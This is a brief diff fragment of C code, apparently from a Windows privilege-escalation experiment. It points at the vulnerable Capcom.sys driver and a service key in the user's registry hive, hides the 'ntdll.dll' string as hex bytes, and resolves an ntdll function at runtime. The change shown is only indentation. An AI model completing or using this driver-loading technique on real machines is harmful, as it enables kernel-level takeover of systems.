@@ -54,7 +54,7 @@ int main()
 	UNICODE_STRING pPath;
 	UNICODE_STRING pPathReg;
 	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
-  PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
+	PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
 	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
 	HMODULE hObsolete = GetModuleHandleA(NTDLL);
 	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
